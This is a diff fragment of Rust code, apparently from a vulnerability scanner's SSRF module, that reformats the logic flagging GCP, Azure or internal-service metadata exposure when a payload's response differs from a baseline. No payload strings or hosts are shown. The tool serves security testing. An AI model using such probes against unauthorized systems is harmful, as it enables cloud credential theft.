-                return Some(Self::create_vulnerability_static(parameter, &ssrf_payload.payload, test_url,
-                    &format!("GCP metadata accessible via {}", ssrf_payload.category.as_str()),
-                    Confidence::High, format!("GCP indicator: {}", indicator), &ssrf_payload.category));
+            if body_lower.contains(indicator)
+                && !baseline_lower.contains(indicator)
+                && significant_change
+            {
+                return Some(Self::create_vulnerability_static(
+                    parameter,
+                    &ssrf_payload.payload,
+                    test_url,
+                    &format!(
+                        "GCP metadata accessible via {}",
+                        ssrf_payload.category.as_str()
+                    ),
+                    Confidence::High,
+                    format!("GCP indicator: {}", indicator),
+                    &ssrf_payload.category,
+                ));
             }
         }
 
         for indicator in &azure_indicators {
-            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) && significant_change {
-                return Some(Self::create_vulnerability_static(parameter, &ssrf_payload.payload, test_url,
-                    &format!("Azure metadata accessible via {}", ssrf_payload.category.as_str()),
-                    Confidence::High, format!("Azure indicator: {}", indicator), &ssrf_payload.category));
+            if body_lower.contains(indicator)
+                && !baseline_lower.contains(indicator)
+                && significant_change
+            {
+                return Some(Self::create_vulnerability_static(
+                    parameter,
+                    &ssrf_payload.payload,
+                    test_url,
+                    &format!(
+                        "Azure metadata accessible via {}",
+                        ssrf_payload.category.as_str()
+                    ),
+                    Confidence::High,
+                    format!("Azure indicator: {}", indicator),
+                    &ssrf_payload.category,
+                ));
             }
         }
 
         for indicator in &internal_indicators {
-            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) && significant_change {
-                return Some(Self::create_vulnerability_static(parameter, &ssrf_payload.payload, test_url,
-                    &format!("Internal service accessible via {}", ssrf_payload.category.as_str()),
-                    Confidence::High, format!("Internal indicator: {}", indicator), &ssrf_payload.category));
+            if body_lower.contains(indicator)
+                && !baseline_lower.contains(indicator)
+                && significant_change
+            {
+                return Some(Self::create_vulnerability_static(
+                    parameter,
+                    &ssrf_payload.payload,
+                    test_url,
+                    &format!(
+                        "Internal service accessible via {}",
+                        ssrf_payload.category.as_str()
+                    ),
+                    Confidence::High,
+                    format!("Internal indicator: {}", indicator),
+                    &ssrf_payload.category,
+                ));
             }
         }
 
         None
     }
 
-    fn create_vulnerability(&self, parameter: &str, payload: &str, test_url: &str,
-        description: &str, confidence: Confidence, evidence: String, category: &SsrfBypassCategory) -> Vulnerability {
-        Self::create_vulnerability_static(parameter, payload, test_url, description, confidence, evidence, category)
+    fn create_vulnerability(
+        &self,
+        parameter: &str,
+        payload: &str,
+        test_url: &str,
+        description: &str,
+        confidence: Confidence,
+        evidence: String,
+        category: &SsrfBypassCategory,
+    ) -> Vulnerability {
+        Self::create_vulnerability_static(
+            parameter,
+            payload,
+            test_url,
+            description,
+            confidence,
+            evidence,
+            category,
+        )
     }
 
-    fn create_vulnerability_static(parameter: &str, payload: &str, test_url: &str,
-        description: &str, confidence: Confidence, evidence: String, category: &SsrfBypassCategory) -> Vulnerability {
+    fn create_vulnerability_static(
+        parameter: &str,
+        payload: &str,
+        test_url: &str,
+        description: &str,
+        confidence: Confidence,
+        evidence: String,
+        category: &SsrfBypassCategory,
+    ) -> Vulnerability {
         Vulnerability {
             id: format!("ssrf_{:x}", rand::random::<u32>()),
             vuln_type: format!("SSRF ({})", category.as_str()),
